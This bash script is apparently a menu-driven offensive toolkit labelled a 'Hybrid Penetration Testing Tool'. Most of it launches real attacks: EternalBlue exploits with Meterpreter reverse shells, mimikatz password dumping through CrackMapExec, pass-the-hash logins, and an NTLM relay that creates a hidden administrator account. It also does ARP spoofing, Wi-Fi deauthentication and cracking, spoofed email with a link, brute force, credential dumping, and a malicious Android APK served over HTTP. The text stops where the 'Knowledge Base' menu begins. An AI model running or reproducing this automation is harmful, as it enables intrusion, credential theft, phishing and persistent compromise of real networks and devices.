i=445
j=4444

OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
RESET='\e[0m'
REGEX='^[0-9]+$'

clear



function banner {
        echo -e "$OKRED                                                   $RESET"
        echo -e "$OKRED                                                   $RESET"
	echo -e "$OKRED                                                   $RESET"
        echo -e "$OKRED---------------------------------------------------$RESET"
        echo -e "$OKRED                                                   $RESET"
        echo -e "$OKRED ░█▀▀█ █▀▄▀█ █▀▀▄ █▀▀█ █▀▀ █▀▀ █▀▀█ █▀▀▄ █▀▀█ ▒█▀▀█ "
        echo -e "$OKRED ▒█▄▄█ █░▀░█ █▀▀▄ █▄▄█ ▀▀█ ▀▀█ █▄▄█ █░░█ █░░█ ▒█▄▄▀ "
        echo -e "$OKRED ▒█░▒█ ▀░░░▀ ▀▀▀░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀░ ▀▀▀▀ ▒█░▒█ "
        echo -e "$OKRED                                                   $RESET"
        echo -e "$OKRED---------------------------------------------------$RESET"
        echo -e "           Hybrid Penetration Testing Tool"
        echo -e " "
        echo -e "$OKORANGE             [Created by Moriel Harush]      $RESET"
        echo -e " "
        echo -e "           Contact : HarushMoriel@gmail.com " 
        echo -e " "
        }
        
function e {
	banner
        echo "Choose one of the following Options: "
        echo -e " "
        echo " [1] Infrastructre Attacks"
        echo -e " "
        echo " [2] Android Attacks"
        echo -e " "
        echo " [3] Knowledge Base"
        echo -e " "
        echo " [4] Web Application Attacks"
        echo -e " "
        read -p "Enter your choice --> " choice
        clear
        
        if [ "$choice" != "1" -a "$choice" != "2" -a "$choice" != "3" -a "$choice" != "4"  ]; then
                choice=1000
        fi
        }
        
e

if [ "$choice" = "1" ]; then
	banner
        echo "Choose one of the following attacks: "
        echo -e " "
        echo " [1] Eternal Blue ( MS17-010 )"
        echo -e " "
        echo " [2] Crack Map Exec ( Get all passwords )"
        echo -e " "
        echo " [3] PsExec ( Connect to host Password )"
        echo -e " "
        echo " [4] pth-winexe ( Connect to host with Hash or Password )"
        echo -e " "
        echo " [5] MITM ( Man In The Middle )"
        echo -e " "
        echo " [6] Wi-Fi ( Get Handshake )"
        echo -e " "
        echo " [7] HTTP Server ( Python )"
        echo -e " "
        echo " [8] Mail Spoofing ( SMTP )"
        echo -e " "
        echo " [9] Advanced NMAP Scanning"
        echo -e " "
        echo " [10] Create Listener"
        echo -e " "
		echo " [11] NetDiscover ( ARP Scan )"
        echo -e " "
		echo " [12] Hash Cracking " 
		echo -e " " 
		echo " [13] Password Attacks ( Brute Force )"
		echo -e " " 
		echo " [14] RPC Client And SMB Client Scan"
		echo -e " " 
		echo " [15] Sam And System Cracking"
		echo -e " " 
        read -p "Enter your choice --> " choice
        clear

        if [ "$choice" = "1" ]; then
                command service postgresql start
                clear
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                       -+= Eternal Blue ( MS17-010 ) =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo "Choose one of the following options"
                echo -e " "
                echo "[1] For One Target"
                echo -e " "
                echo "[2] For List Of Targets ( MS17-010-iplist.txt )"
                echo -e " "
                echo -e " "
                read -p "Enter your choice: " choice
                clear

						if [ "$choice" = "1" ]; then
											echo -e " "
											read -p "Enter your IP Address: " myIP
											echo -e " "
											read -p "Enter Target IP Address: " TargetIP
											
											echo -e " "
											echo "Choose one of the following options"
											echo -e " "
											echo "[1] x64 64bit"
											echo -e " "
											echo "[2] x86 32bit"
											echo -e " "
											echo "[3] Eternal Blue Standard"
											echo -e " "
											read -p "Enter your choice: " choice
											clear
												if [ "$choice" = "1" ]; then
																	gnome-terminal -- msfconsole -x "use exploit/windows/smb/eternalblue_doublepulsar; set RHOSTS $TargetIP; set RPORT $i; set LHOST $myIP; set LPORT $j; set PROCESSINJECT explorer.exe; set 					TARGETARCHITECTURE x64; set payload windows/x64/meterpreter/reverse_tcp; run"
																	echo -e " "
																	echo "Exploiting $TargetIP and establishing reverse connection on local port $i"
																	echo -e " "                     
												fi
																	
												if [ "$choice" = "2" ]; then
															gnome-terminal -- msfconsole -x "use exploit/windows/smb/eternalblue_doublepulsar; set RHOSTS $TargetIP; set RPORT $i; set LHOST $myIP; set LPORT $j; set PROCESSINJECT explorer.exe; set 					TARGETARCHITECTURE x86; set payload windows/meterpreter/reverse_tcp; run"
																	echo -e " "
																	echo "Exploiting $TargetIP and establishing reverse connection on local port $i"
																	echo -e " "      
												fi
																	
												if [ "$choice" = "3" ]; then
																	gnome-terminal -- msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST $TargetIP; set RPORT $i; set LHOST $myIP; set LPORT $j; set PAYLOAD windows/meterpreter/reverse_tcp; run"
																	echo -e " "
																	echo "Exploiting $TargetIP and establishing reverse connection on local port $i"
																	echo -e " "     
												fi
												fi
						
										if [ "$choice" = "2" ]; then
															echo -e " "
															read -p "Enter your IP Address: " myIP
															for ip in $(cat ~/Desktop/MS17-010-iplist.txt)
															do
																gnome-terminal -- msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST $ip; set RPORT $i; set LHOST $myIP; set LPORT $j; set PAYLOAD windows/meterpreter/reverse_tcp; run"
																echo -e " "
																echo "Exploiting $ip and establishing reverse connection on local port $i"
																echo -e " "
																i=$(($i+1))
															done
										fi      
											
										if [ "$choice" != "1" -a "$choice" != "2" ]; then
															echo -e " "
										fi
										fi


        if [ "$choice" = "2" ]; then
                banner
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                   -+= Crack Map Exec ( Get all passwords ) =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo "Choose one of the following options"
                echo -e " "
                echo "[1] For User and Password "
                echo -e " "
                echo "[2] For User and Hash: "
                echo -e " "
                echo -e " "
                read -p "Enter your choice: " choice
				clear
                
										if [ "$choice" = "1" ]; then
														echo -e " "
														read -p "Enter IP Address: " IPs1
														echo -e " "
														read -p "Enter UserName: " UserName1
														echo -e " "
														read -p "Enter Password: " Password1
														echo -e " "
														command crackmapexec smb $IPs1 -u $UserName1 -p $Password1 -M mimikatz
														echo "Geting All Passwords On $IPs1 -->"
														echo -e " "
										fi
												
										if [ "$choice" = "2" ]; then
														echo -e " "
														read -p "Enter IP Address: " IPs2
														echo -e " "
														read -p "Enter UserName: " UserName2
														echo -e " "
														read -p "Enter Hash: " Hash2
														echo -e " "
														command python3 crackmapexec smb $IPs2 -u $UserName2 -p $Hash2 -M mimikatz
														echo "Geting All Passwords On $IPs2 -->"
														echo -e " "
										fi
												
										if [ "$choice" != "1" -a "$choice" != "2" ]; then
											echo -e " "
										fi
										fi
        
        if [ "$choice" = "3" ]; then
                banner
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "              -+= PsExec ( Connect to target with Password ) =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                read -p "Enter Username: " Uname
                echo -e " "
                read -p "Enter Password: " Password
                echo -e " "
                read -p "Enter Target IP: " TargetIP
                echo -e " "
                echo -e "Connecting To Target ---> $TargetIP "
                echo -e " "
                command python ~/Documents/impacket/examples/psexec.py $Uname:$Password@$TargetIP cmd.exe
                echo -e " "
	        echo -e " "
        fi
        
        if [ "$choice" = "4" ]; then
                banner
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "           -+= pth-winexe ( Connect to host with Hash or Password ) =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                read -p "Enter the Domain Name: " Domain
                echo -e " "
                read -p "Enter User Name: " Uname
                echo -e " "
                read -p "Enter Hash or Password: " PassOrHash
                echo -e " "
                read -p "Enter Host IP: " HostIP
                echo -e " "
                echo -e "Connecting To Host ---> $HostIP "
                echo -e " "
                command pth-winexe -U $Domain/$Uname%$PassOrHash //$HostIP cmd
                echo -e " "
	        echo -e " "
        fi

        if [ "$choice" = "5" ]; then
        	banner
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                  -+= Responder Attacks ( Man In The Middle ) =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e " "
                echo -e "[1] NtlmRelayX RPC User Creation ( Domain Attack - Admin User Only )"
                echo -e " "
                echo -e "[2] NtlmRelayX Code Execution ( Weak User Only )"
                echo -e " "
                echo -e "[3] Responder NTLM Hashes Only ( Simply Listener )"
                echo -e " "
                echo -e "[4] MIMTF Arp Spoofing"
                echo -e " "
                echo -e "[5] Arp Spoofing ( Default Kali )"
                echo -e " "
				read -p "Enter Your Choose:" choice 
                echo -e " "
				clear
													if [ "$choice" = "1" ]; then
															read -p "Enter the Default Gateway IP Address: " dg
															echo -e " "
															echo -e "Set: --> $dg "
															echo -e " "
															read -p "Enter the Subent: " subnet
															echo -e " " 
															echo -e "Set: --> $subnet " 
															echo -e " "
															command gnome-terminal -- python ~/Documents/ResponderEdited/Responder.py -I eth0 -r -w -d 
															echo -e " "
															echo -e " "
															command gnome-terminal -- ntlmrelayx.py -ip 0.0.0.0 -t rpc://$dg -c "net user ptuser Aa1469054!$ /add && net localgroup Administrators ptuser /add"
													fi
													if [ "$choice" = "2" ]; then
															banner
															echo -e " "
															read -p "Enter the Subent: " subnet
															echo -e " " 
															echo -e "Set: --> $subnet " 
															echo -e " "
															read -p "Enter Command To Execute: " command
															echo -e " " 
															command gnome-terminal -- python ~/Documents/ResponderEdited/Responder.py -I eth0 -r -w -d 
															echo -e " " 
															sleep 15
															echo -e " " 
															command gnome-terminal -- crackmapexec smb $subnet --gen-relay-list ~/Desktop/smbtargets.txt 
															echo -e " "
															echo -e " "
															read -p "Press Enter When Its DONE ! " input
															echo -e " " 
															echo -e " Lets go: $input " 
															command gnome-terminal -- ntlmrelayx.py -tf ~/Desktop/smbtargets.txt -smb2support -c $command
													fi
													if [ "$choice" = "3" ]; then
															read -p "We Are Going To Open a Listener , Pleas Press ENTER When You Are READY!" 
															echo -e " "
																command gnome-terminal -- responder -I eth0
													fi
													fi

													if [ "$choice" = "4" ]; then
																   banner
															echo -e " "
															echo -e " MITMF Arp Spoofing " 
															echo -e " " 
															read -p "Enter the Default Gateway IP Address: " gateway
															echo -e " "
															echo -e "Poisoning the Default Gateway --> $gateway "
															echo -e " "
															echo -e " "
															command python ~/Documents/MITMf/mitmf.py -i eth0 --spoof --arp --gateway $gateway --responder --wpad
															echo -e " "
															echo -e " "
													fi
													if [ "$choice" = "5" ]; then
															banner
															echo -e " "
															echo -e "Arp Spoofing " 
															echo -e " " 
															read -p "Enter the Default Gateway IP Address: " gateway
															echo -e " "
															echo -e "Poisoning the Default Gateway --> $gateway "
															echo -e " "
															read -p "Enter The Target's IP: " targetip
															echo -e " "
															echo -e "Target SET -> $targetip "
															echo -e " " 
															read -p "Enter The Attacker's IP : " attacker
															echo -e " " 
															command iptables -t nat -A PREROUTING -p TCP -j DNAT --to-destination $attacker
															echo -e " " 
															echo -e " IP Tables is Routing now .. "  
															echo -e " " 
															command iptables -t nat -A POSTROUTING -j MASQUERADE
															echo -e " "
															echo -e " IP Tables Has Been Routed , WE ALL SET ! "  
															echo -e " "
															command gnome-terminal -- responder -I eth0 -b 
															echo -e " " 
															echo -e " Opening Responder , Poisoining the IIS Organizational Server "
															echo -e " "  
															command gnome-terminal -- arpspoof -i eth0 -t $targetip $gateway -r 
															echo -e " " 
															echo -e " ArpSpoof is ON " 
															echo -e " "
													fi

        if [ "$choice" = "6" ]; then
                banner
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                              -+= Wi-Fi Cracker =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
				echo -e " "
				echo -e "[1] Wifi Bug Fixer"
                echo -e " "
                echo -e "[2] Wi-Fi Attack"
                echo -e " "
				read -p "Enter Your Choose:" choice 
                echo -e " "
				clear
							if [ "$choice" = "1" ]; then
										echo -e " " 
										command ifconfig wlan0 down
										command iwconfig wlan0 mode monitor
										command airmon-ng check kill
										sleep 10
										command kill all 
										sleep 3
										command airmon-ng check kill
										command ifconfig wlan0 down
										command iwconfig wlan0 mode monitor
							fi
							if [ "$choice" = "2" ]; then
										echo -e "Starting Wi-Fi Attack"
										gnome-terminal -- airmon-ng
										sleep 3
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										echo -e $OKORANGE"                                                                 $RESET"
										echo -e $OKORANGE"                                                                 $RESET"
										echo -e "Press CTRL + C When You Finished The Scan * Important * : "
										echo -e $OKORANGE"                                                                 $RESET"
										echo -e $OKORANGE"________________________________________________________________ $RESET"
										sleep 5
										command airodump-ng wlan0 
										echo -e " " 
										echo -e " " 
										read -p "Enter Bssid Name: " BssidName
										echo -e " "
										read -p "Enter Channel: " Channel
										echo -e " "
										read -p "Enter Bssid: " Bssid
										echo -e " "
										gnome-terminal -- airodump-ng -c $Channel --bssid $Bssid wlan0 -w /root/Desktop/$BssidName
										echo -e " "
										read -p "Enter Number Of Attacks (10~100): " attacks
										echo -e " " 
										read -p "Enter Bssid: " bssid2
										echo -e " " 
										read -p "Enter Victim's Station: " victim
										aireplay-ng --deauth $attacks -a $bssid2 -c $victim wlan0
										echo -e " "
										sleep 8
										read -p " Enter PCAP File Path:" path
										command aircrack-ng -w /usr/share/wordlists/rockyou.txt $path
										echo -e " "
										read -p " Press Enter To Finish : " finish
										choice=1000
										
							fi
        fi
        
        if [ "$choice" = "7" ]; then
                banner
                #just add the script to the path of the kali linux so you can use it from any directory 
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                     -+= HTTP Server ( Python ) =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                read -p "Enter the port you want to connect to : " port1
                echo -e " "
                echo -e "Start SimpleHTTPServer ---> "
                echo -e " "
                command python -m SimpleHTTPServer $port1
                echo -e " "
        fi
        
        if [ "$choice" = "8" ]; then
                banner
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                      -+= Mail Spoofing ( SMTP ) =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e " "
                read -p "Enter Recipient's Mail Server: " server
                echo -e " "
                read -p "Enter From Email Address: " from
                echo -e " "
                read -p "Enter To Email Address: " to
                echo -e " "
                read -p "Enter A URL ( optional ): " Link
                echo -e " "

                # create message
                function mail_input {
                echo "ehlo $(hostname -f)"
                echo "MAIL FROM: <$from>"
                echo "RCPT TO: <$to>"
                echo "DATA"
                echo "From: <$from>"
                echo "To: <$to>"
                echo "Subject: Test Mail"
                echo "Hi,"
                echo "This is a test mail !!!"
                echo "$Link"
                echo "Thanks,"
                echo "."
                echo "quit"
                }                      

                mail_input | netcat $server 25 || err_exit
        fi

        if [ "$choice" = "9" ]; then
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                        -+= Advanced NMAP Scanning =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e " "
                echo "[1] Deep Scan"
                echo -e " "
                echo "[2] Advanced Scan"
                echo -e " "
				echo "[3] UDP Scan"
				echo -e " " 
				echo "[4] Simple Scan ( Only Alive Check )"
				echo -e " "
				read -p "Enter your choice: " choice
				echo -e " " 
				read -p "Enter an IP Address or Subnet: " ip
				echo -e " " 
            	echo -e " "
				clear
											if [ "$choice" = "1" ]; then
													command nmap -A -p- $ip -oX /root/Desktop/Deepscan.txt
													echo -e " "
													echo "Scanning $ip "
													echo -e " "
											fi
											if [ "$choice" = "2" ]; then
													command nmap -sV -A -T5 -O -F --version-light -oN /root/Desktop/Advanced_Nmap_Scann.txt $ip
													echo -e " "
													echo "Scanning $ip "
													echo -e " "
											fi
											if [ "$choice" = "3" ]; then
													command nmap -sU --min-rate 5000 -p- $ip 
													echo -e " "
													echo "Scanning $ip "
													echo -e " "
											fi
											if [ "$choice" = "4" ]; then
													command nmap -sP $ip 
													echo -e " "
													echo "Scanning $ip "
													echo -e " "
											fi

        fi
        
        if [ "$choice" = "10" ]; then
                command service postgresql start
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                          -+= Create Listener At MSF =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                read -p "Enter a Listener IP Addres: " ip
                gnome-terminal -- msfconsole -x "use exploit/multi/handler; set LHOST $IP; set LPORT 4444; set PAYLOAD windows/meterpreter/reverse_tcp; run"
                echo -e " "
				echo "Scanning $ip "
				echo -e " "
        fi
        
		 if [ "$choice" = "11" ]; then
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                          -+= Netdiscover Scanning =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
				echo -e " " 
                read -p "Enter The IP Subnet You Wish To Scan: " ip
                command netdiscover -r $ip
                echo -e " "
				echo "Scanning $ip "
				echo -e " "
        fi
        
		if [ "$choice" = "12" ]; then
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                          -+= Hash Cracking =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
				echo -e " " 
				echo "[1] Hash Cat "
				echo -e " "
				echo "[2] John The Ripper " 
				echo -e " " 
				read -p " Enter Your Choice: " choice 
				echo -e " " 
				echo -e " "
				clear
											if [ "$choice" = "1" ]; then
													echo -e $OKORANGE"________________________________________________________________ $RESET"
													echo -e " "
													echo -e "                          -+= Hash Cat =+-"
													echo -e $OKORANGE"________________________________________________________________ $RESET"
													echo -e " "
													echo -e " " 
													echo -e "[1] NTLM Hash Cracking ( Sam Hashes ) " 
													echo -e " " 
													echo -e "[2] NTLMv2 Hash Cracking ( Responder Hashes ) "
													echo -e " " 
													read -p " Enter Your Choice: " choice 
													echo -e " "
													clear
																	if [ "$choice" = "1" ]; then
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " "
																			echo -e "                      -+= NTLM Hash Cracking ( Sam Hashes ) =+-"
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " " 
																			echo -e " " 
																			read -p "Enter The NTLM Hash File Path: " hash
																			echo -e " " 
																			command hashcat -m 1000 $hash /usr/share/wordlists/rockyou.txt --force 
																			echo -e " " 
																	fi
																	if [ "$choice" = "2" ]; then
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " "
																			echo -e "                  -+= NTLMv2 Hash Cracking ( Responder Hash ) =+-"
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " " 
																			echo -e " " 
																			read -p "Enter The NTLMv2 Hash File Path: " hash
																			echo -e " " 
																			command hashcat -m 5600 $hash /usr/share/wordlists/rockyou.txt --force 
																	fi
											fi
											if [ "$choice" = "2" ]; then
													echo -e $OKORANGE"________________________________________________________________ $RESET"
													echo -e " "
													echo -e "                          -+= John The Ripper  =+-"
													echo -e $OKORANGE"________________________________________________________________ $RESET"
													echo -e " "
													echo -e " " 
													echo "[1] NT Hash Cracking "
													echo -e " " 
													echo "[2] PDF Cracking " 
													echo -e " " 
													echo "[3] SSH Cracking ( RSA Key )"
													echo -e " " 
													echo "[4] Kerberos Hash Cracking (krb5pa)"
													echo -e " " 
													echo "[5] John Password Checker ( Last Hashes Cracked From File )"
													echo -e " " 
													read -p " Enter Your Choice: " choice
													echo -e " " 
													clear
																	if [ "$choice" = "1" ]; then
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " "
																			echo -e "                          -+= NT Hash Cracking =+-"
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " " 
																			echo -e " " 
																			read -p "Enter The NT Hash File Path: " path
																			echo -e " " 
																			command john --format=nt $path --wordlist=/usr/share/wordlists/rockyou.txt 
																	fi
																	if [ "$choice" = "2" ]; then
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " "
																			echo -e "                          -+= PDF Cracking =+-"
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " " 
																			echo -e " " 
																			read -p "Enter The PDF File Path: " path2
																			echo -e " " 
																			read -p "Enter The PDF Output Path You Wish: " output2
																			command cd /usr/share/john
																			echo -e " " 
																			command ./pdf2john.pl path2 > output2 
																			sleep 5 
																			command john output2 
																			echo -e " "
																	fi
																	if [ "$choice" = "3" ]; then
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " "
																			echo -e "                          -+= SSH Cracking(RSA Key) =+-"
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " " 
																			echo -e " " 
																			read -p "Enter The SSH File Path: " path1
																			echo -e " " 
																			read -p "Enter The Cracking Output Path You Wish:(Desktop,root,etc..) " output1
																			echo -e " " 
																			command cd /usr/share/john
																			echo -e " " 
																			command ./ssh2john $path1 > $output1 
																			echo -e " " 
																			sleep 15
																			command john --wordlist=/usr/share/wordlists/rockyou.txt $output1 
																	fi
																	if [ "$choice" = "4" ]; then
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " "
																			echo -e "                          -+= Kerberos krb5pa Cracking =+-"
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " " 
																			echo -e " " 
																			read -p "Enter The Kerberos Hash File Path: " path
																			echo -e " " 
																			command john $path 
																	fi
																	if [ "$choice" = "5" ]; then
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " "
																			echo -e "                          -+= John Password Crack Checker =+-"
																			echo -e $OKORANGE"________________________________________________________________ $RESET"
																			echo -e " " 
																			echo -e " " 
																			read -p "Enter The File Path " path
																			echo -e " " 
																			command john $path --show
																	fi
											fi
				
        fi
		
		if [ "$choice" = "13" ]; then
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                          -+= Password Attacks =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
				echo -e " " 
                echo "[1] Hydra"
                echo -e " "
                echo "[2] None"
                echo -e " "
				echo "[3] None"
				echo -e " " 
				read -p "Enter your choice: " choice
				echo -e " "
				echo -e " "
											if [ "$choice" = "1" ]; then
											                echo -e $OKORANGE"________________________________________________________________ $RESET"
															echo -e " "
															echo -e "                          -+= Hydra =+-"
															echo -e $OKORANGE"________________________________________________________________ $RESET"
															echo -e " " 
															echo -e " " 
															echo "[1] Single User And Single Password"
															echo -e " " 
															echo "[2] Single User And Password List"
															echo -e " " 
															echo "[3] User List And Single Password"
															echo -e " " 
															echo "[4] User List And Password List"
															echo -e " " 
															read -p "Enter Your Choice: " choice
															clear
																					if [ "$choice" = "1" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                   -+= Hydra - Single User And Single Password =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The IP: " ip
																								echo -e " " 
																								read -p "Enter The Username: " user 
																								echo -e " " 
																								read -p "Enter The Password: " pass
																								echo -e " " 
																								read -p "Enter The Service (rdp,ssh,etc): " service
																								echo -e " " 
																								command hydra -l $user -p $pass $ip $service -V -f -t 2		
																					fi
																					if [ "$choice" = "2" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                   -+= Hydra - Single User And Password List =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The IP: " ip
																								echo -e " " 
																								read -p "Enter The Username: " user 
																								echo -e " " 
																								read -p "Enter The Password List: " passlist
																								echo -e " " 
																								read -p "Enter The Service (rdp,ssh,etc): " service
																								echo -e " " 
																								command hydra -l $user -p $passlist $ip $service -V -f -t 2		
																					fi
																					if [ "$choice" = "3" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                   -+= Hydra - User List And Single Password =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The IP: " ip
																								echo -e " " 
																								read -p "Enter The Username List: " userlist
																								echo -e " " 
																								read -p "Enter The Password: " pass
																								echo -e " " 
																								read -p "Enter The Service (rdp,ssh,etc): " service
																								echo -e " " 
																								command hydra -l $userlist -p $pass $ip $service -V -f -t 2		
																					fi
																					if [ "$choice" = "4" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                   -+= Hydra - User List And Password List =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The IP: " ip
																								echo -e " " 
																								read -p "Enter The Username List: " userlist 
																								echo -e " " 
																								read -p "Enter The Password List: " passlist
																								echo -e " " 
																								read -p "Enter The Service (rdp,ssh,etc): " service
																								echo -e " " 
																								read -p "Enter The IP: " ip
																								command hydra -l $userlist -p $passlist $ip $service -V -f -t 2		
																					fi
											fi	
				
				
        fi
		
		if [ "$choice" = "14" ]; then
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                          -+= RPC Client And SMB Client Scan =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
				echo -e " " 
                echo "[1] Rpc Client Connect " 
                echo -e " "
				echo "[2] SMB Client Connent " 
				echo -e " "
				read -p " Enter Your Choice: " choice
				clear
																					if [ "$choice" = "1" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                           -+= Rpc Client Connect  =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The IP: " ip
																								echo -e " " 
																								echo -e " Commands You Can Use : querydominfo , enumdomusers , query user [user] " 
																								echo -e " " 
																								command rpcclient -U "" $ip
																					fi
																					if [ "$choice" = "2" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                           -+= SMB Client Connect  =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The IP: " ip
																								echo -e " "  
																								echo -e " " 
																								command smbclient -L \\$ip
																					fi	
        fi
		
		if [ "$choice" = "15" ]; then
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
                echo -e "                          -+= Sam And System Files Cracking =+-"
                echo -e $OKORANGE"________________________________________________________________ $RESET"
                echo -e " "
				echo "[1] Samdump2 ( Extract Hashes Over Sam&System ) " 
				echo " "
				echo "[2] Secretsdump ( Extract Hashes Over Sam&System Impacket Way ) "
				echo " "
				echo "[3] Secretsdump ( Extract Hashes Over Username&IP ) " 
				echo -e " "
				read -p " Enter Your Choice : " choice 
				echo -e " "
				clear
				
																					if [ "$choice" = "1" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                   -+= Samdump2 - Extract Hashes Over Sam&System =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The System File Path: " system
																								echo -e " " 
																								read -p "Enter The Sam File Path: " sam
																								echo -e " " 
																								command samdump2 $system $sam 
																					fi
																					if [ "$choice" = "2" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                   -+= Secretsdump - Extract Hashes Over Sam&System =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The System File Path: " system
																								echo -e " " 
																								read -p "Enter The Sam File Path: " sam
																								echo -e " " 
																								command python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam $sam -system $system
																					fi
																					if [ "$choice" = "3" ]; then
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " "
																								echo -e "                -+= Secretsdump - Extract Hashes Over Username&IP =+-"
																								echo -e $OKORANGE"________________________________________________________________ $RESET"
																								echo -e " " 
																								echo -e " " 
																								read -p "Enter The Username: " user
																								echo -e " " 
																								read -p "Enter The IP : " ip
																								echo -e " " 
																								command python /usr/share/doc/python3-impacket/examples/secretsdump.py $user@$ip
																					fi	
        fi
		
        if [ "$choice" != "1" -a "$choice" != "2" -a "$choice" != "3" -a "$choice" != "4" -a "$choice" != "5" -a "$choice" != "6" -a "$choice" != "7" -a "$choice" != "8" -a "$choice" != "9" -a "$choice" != "10" -a "$choice" != "11" -a "$choice" != "12" -a "$choice" != "13" -a "$choice" != "14" -a "$choice" != "15" ]; then
                choice=1000
        fi
fi


if [ "$choice" = "2" ]; then
        banner
        echo -e $OKORANGE"________________________________________________________________ $RESET"
        echo -e " "
        echo -e "                       -+= Android Attack =+-"
        echo -e $OKORANGE"________________________________________________________________ $RESET"
        echo -e " "
        echo "Choose one of the following commands: "
        echo -e " "
        echo "[1] Create Evil APK"
        echo -e " "
        echo -e " "
        read -p "Enter your choice --> " choice
        echo -e " "
        if [ "$choice" = "1" ]; then
                echo -e " "
                read -p "Enter Listener IP Address: " myIP
                echo -e " "
                read -p "Enter Port Number: " Port
                echo -e " "
                echo -e " "
                command service postgresql start
                command msfvenom -p android/meterpreter/reverse_tcp LHOST=$myIP LPORT=$Port R > /root/Desktop/Evil-App.apk
                echo -e " "
                echo -e " "
                gnome-terminal -- msfconsole -x "use exploit/multi/handler; set LHOST $myIP; set LPORT $Port; set payload android/meterpreter/reverse_tcp; run"
                command cd Desktop
                command python -m SimpleHTTPServer
                echo -e " "
	        echo "Exploiting $TargetIP and establishing reverse connection on local port $Port"
                echo -e " "
        fi
        
        if [ "$choice" != "1" ]; then
                choice=1000
        fi
fi



if [ "$choice" = "3" ]; then
        banner
